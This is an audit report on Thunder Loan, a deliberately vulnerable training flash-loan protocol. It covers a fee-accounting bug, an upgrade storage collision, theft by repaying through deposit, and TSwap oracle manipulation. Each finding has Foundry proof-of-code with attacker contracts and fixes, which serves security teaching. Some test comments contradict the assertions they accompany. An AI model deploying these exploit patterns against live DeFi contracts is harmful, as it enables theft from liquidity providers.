---
title: Thunder Loan Audit Report
author: Yusuf Sahin
date: March 17, 2026
---

Prepared by: Yusuf Sahin

Lead Auditor:
- Yusuf Sahin

Codebase: Thunder Loan, an intentionally vulnerable training protocol from the [Cyfrin Updraft](https://updraft.cyfrin.io) smart contract security course.

# Table of Contents
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Scope Details](#audit-scope-details)
  - [Roles](#roles)
  - [Known Issues](#known-issues)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
  - [Medium](#medium)

# Protocol Summary

The ThunderLoan protocol gives users a way to take out flash loans and gives liquidity providers a way to earn money on their capital. Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans!

Users additionally have to pay a small fee to the protocol depending on how much money they borrow. To calculate the fee, ThunderLoan protocol uses the on-chain TSwap price oracle.

# Disclaimer

Yusuf Sahin makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Scope Details
The findings described in this document correspond to the following commit hash:
```
026da6e73fde0dd0a650d623d0411547e3188909
```
 
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```
## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.

## Known Issues

- None

## Issues found
| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 1                      |
| Low      | 0                      |
| Info     | 0                      |
| Total    | 4                      |

Proofs of concept for every finding are in `test/unit/ThunderLoanTest.t.sol` and pass with `forge test`.

# Findings
## High

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying tokens. In this way, it is responsible for keeping track of how many fees to give to liquidity providers. 

However, the `deposit` function updates this rate, without collecting any fees.

```javascript
 function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token]; 
        uint256 exchangeRate = assetToken.getExchangeRate();

        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug. 

1. The `redeem` function is blocked, because the protocol thinks the owed tokens are more than it has
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than deserved.

**Proof of Concept:** 

1. LP deposits 
2. User takes out a flash loan
3. It is now impossible for the LP to redeem.

**Proof of Code**

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testRedeem() public setAllowedToken hasDeposits{
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // The LP should be able to withdraw everything plus the fee they earned.
        // Because deposit() inflated the exchange rate, the protocol owes more than it holds and redeem reverts.
        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from `deposit`.

```diff
 function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token]; 
        uint256 exchangeRate = assetToken.getExchangeRate();

        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning` , freezing protocol 

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and replacing a storage variable with a constant breaks the storage layout as well.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. 

More importantly, the `s_currentlyFlashLoaning` mapping ends up in the wrong storage slot, which can freeze the protocol. 

**Proof of Concept:** 

**Proof of Code**

Place the following into `ThunderLoanTest.sol`

```javascript
    import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol"
    .
    .
    .
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`

**Recommended Mitigation:** If you must remove the storage variable, leave it as blank to not mess up the storage slots.

```diff
-   uint256 private s_feePrecision;
-   uint256 private s_flashLoanFee; // 0.3% ETH fee
+   uint private s_blank;
+   uint256 private s_flashLoanFee; // 0.3% ETH fee
+   uint256 public constant FEE_PRECISION = 1e18;
```
### [H-3] Flash loans can be "repaid" with `deposit`, letting the borrower steal the funds

**Description:** `ThunderLoan::flashloan` only checks that the `AssetToken` contract holds at least `startingBalance + fee` after `executeOperation` returns. It does not check how the tokens came back. Inside `executeOperation`, a borrower can call `deposit` with `amount + fee` instead of `repay`. The tokens land in the `AssetToken` contract, so the balance check passes, but the borrower is also minted asset tokens for that deposit.

```javascript
        uint256 endingBalance = token.balanceOf(address(assetToken));
@>      if (endingBalance < startingBalance + fee) {
            revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
        }
```

**Impact:** After the flash loan ends, the borrower calls `redeem` with their new asset tokens and walks away with the borrowed amount and the fee. Liquidity providers' funds are stolen.

**Proof of Concept:**

1. Attacker takes out a flash loan of 50 `tokenA`.
2. In `executeOperation`, the attacker calls `deposit(tokenA, amount + fee)` instead of `repay`.
3. The flash loan's balance check passes.
4. The attacker calls `redeem` and receives more than `amount + fee`.

**Proof of Code**

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes calldata)
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```

**Recommended Mitigation:** Block deposits for a token while a flash loan of that token is in progress:

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+       if (s_currentlyFlashLoaning[token]) {
+           revert ThunderLoan__CurrentlyFlashLoaning();
+       }
        AssetToken assetToken = s_tokenToAssetToken[token];
```

## Medium

### [M-1] Using TSwap as a price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM. The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will receive drastically reduced fees for providing liquidity.

**Proof of Concept:** The following happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged for the original fee `fee1`. During flash loan, they do the following:
    i. User sells 1000 `tokenA`, tanking the price.
    ii. Instead of repaying right away, user takes out another flash loan for another 1000 `tokenA`.
        a. Due to the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper. 

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

2. The user then repays the first flash loan, and then repays the second flash loan. 

**Proof of Code**

Add this function to `ThunderLoanTest.t.sol`. It shows that the second flash loan is much cheaper after the price is manipulated.

```javascript
function testOracleManupulation() public{
        // 1. Setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap DEx between WETH / TokenA
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        // Ratio 100 WETH & 100 TokenA
        // Price 1:1

        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan
        // Take out of a flash loan of 50 tokenA
        //swap it on the dex, tanking the price > 150 TokenA -> 80 WETH
        // Take out another flash loan of 50 tokenA, and show that the fee is now much higher due to the price manipulation, 
        // > 50 TokenA -> 25 WETH in fees instead of 10 WETH before manipulation
        
        // 4. Take out 2 flash loans
        //     a. Nuke the price of the Weth/tokenA on TSwap
        //     b. To show that doing so greatly reduces the fees we pay on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        // 0.29614740319118389

        uint256 amountToBarrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));
        
        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBarrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo(); 
        console.log("Attack fee is:", attackFee);
        assert(attackFee < normalFeeCost);
    }
```

Then create a new contract `MaliciousFlashLoanReceiver`. 

```javascript
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    // 1. Swap tokenA barrowed for WETH
    // 2. Take out another flash loan, to show difference
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if(!attacked){
            // 1 Swap tokenA barrowed for WETH
            // 2. Take out another flash loan, to show difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
```

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 
 
